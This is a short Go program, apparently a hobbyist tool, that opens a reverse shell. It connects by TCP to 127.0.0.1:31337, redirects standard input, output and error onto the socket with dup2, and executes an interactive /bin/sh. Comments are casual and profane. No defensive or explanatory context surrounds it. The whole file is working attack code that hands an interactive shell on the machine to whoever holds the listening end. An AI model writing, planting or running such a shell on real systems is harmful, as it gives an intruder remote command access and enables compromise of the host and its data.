package main

import "net"
import "os"
import "syscall"

func main () {
  // TODO: Error handling, etc...
  // TODO: work toward PTY...
  conn, _ := net.Dial("tcp", "127.0.0.1:31337") // connect
  tcpConn, _ := conn.(*net.TCPConn) // god I hate Go's sockets
  file, _ := tcpConn.File() // lets make it a file object...
  fd := file.Fd() // and get its file descriotr
  sockfd := int(fd) // and make it an int so we can fuckin use it
  syscall.Dup2(sockfd, syscall.Stdin) // dup2
  syscall.Dup2(sockfd, syscall.Stdout) // dup2
  syscall.Dup2(sockfd, syscall.Stderr) // dup2
  args := []string{"-i"} // args to pass to /bin/sh
  env := os.Environ() // get environment...
  syscall.Exec("/bin/sh", args, env) // fucking execute
}
